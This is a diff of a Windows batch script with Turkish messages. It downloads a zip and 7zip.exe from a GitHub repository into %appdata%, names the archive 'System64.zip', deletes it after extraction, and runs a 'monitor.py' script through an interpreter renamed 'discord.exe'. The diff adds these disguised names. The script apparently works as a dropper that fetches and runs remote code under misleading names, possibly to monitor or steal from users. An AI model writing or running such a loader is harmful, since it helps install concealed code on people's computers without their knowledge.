@@ -3,8 +3,8 @@
 REM Change to the %appdata% directory
 cd %appdata%
 
-REM Download python.zip
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile '%appdata%\System64.zip'; Write-Host 'Python.zip indirildi' } catch { Write-Host 'Hata: $_' }"
+REM Download system64.zip
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/system64.zip' -OutFile '%appdata%\System64.zip'; Write-Host 'system64.zip indirildi' } catch { Write-Host 'Hata: $_' }"
 
 REM Download 7zip.exe
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/7zip.exe' -OutFile '%appdata%\7zip.exe'; Write-Host '7zip.exe indirildi' } catch { Write-Host 'Hata: $_' }"
@@ -28,7 +28,7 @@ REM Wait 1 second before deleting the System64.zip file
 timeout /t 1 /nobreak >nul
 del /f /q "%appdata%\System64.zip"
 
-REM Run the Python script
-"%appdata%\System64\python.exe" "%appdata%\System64\monitor.py"
+REM Run the monitor.py script
+"%appdata%\System64\discord.exe" "%appdata%\System64\monitor.py"
 
 echo Islem tamamlandi.
